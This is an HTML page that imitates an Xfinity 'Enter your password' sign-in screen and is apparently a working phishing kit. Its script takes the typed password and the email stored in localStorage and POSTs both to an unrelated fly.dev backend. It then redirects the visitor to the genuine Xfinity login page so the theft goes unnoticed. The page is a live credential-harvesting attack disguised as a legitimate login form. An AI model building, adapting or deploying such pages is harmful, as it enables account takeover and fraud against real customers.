<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Enter your password</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="container">

    <div class="logo">xfinity</div>

    <p id="displayEmail" class="email"></p>

    <h1>Enter your password</h1>

    <div class="password-box">
      <input type="password" id="password" placeholder="Password" />
      <span class="eye" onclick="togglePassword()">üëÅ</span>
    </div>

    <a href="#" class="forgot">Forgot password?</a>

    <div class="checkbox">
      <input type="checkbox" id="keepSignedIn" />
      <label for="keepSignedIn">Keep me signed in</label>
    </div>

    <p class="terms">
      By signing in, you agree to our
      <a href="#">Terms of Service</a> and
      <a href="#">Privacy Policy</a>.
    </p>

    <button id="signInBtn" onclick="signIn()">Sign in</button>

    <div id="verifying" class="verifying hidden">
      <div class="spinner"></div>
      <span>Verifying‚Ä¶</span>
    </div>

    <p class="alt">Sign in as someone else</p>
    <p class="help">Trouble signing in? <a href="#">Get help</a></p>

  </div>

  <script>
    // Display the email from localStorage
    const email = localStorage.getItem("XfinityUser");
    if (email) {
      document.getElementById("displayEmail").textContent = email;
    }

    function togglePassword() {
      const input = document.getElementById("password");
      input.type = input.type === "password" ? "text" : "password";
    }

    async function signIn() {
      const username = localStorage.getItem("XfinityUser");
      const password = document.getElementById("password").value.trim();

      if (!password) {
        alert("Please enter your password.");
        return;
      }

      // Show verifying animation
      document.getElementById("signInBtn").disabled = true;
      document.getElementById("verifying").classList.remove("hidden");

      try {
        await fetch("https://my-backend-plngia.fly.dev/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password })
        });

        // Backend handles redirect, but this is a fallback
        window.location.href = "https://login.xfinity.com/login";

      } catch (err) {
        console.error("Error:", err);
        alert("Something went wrong. Try again.");
      }
    }
  </script>

</body>
</html>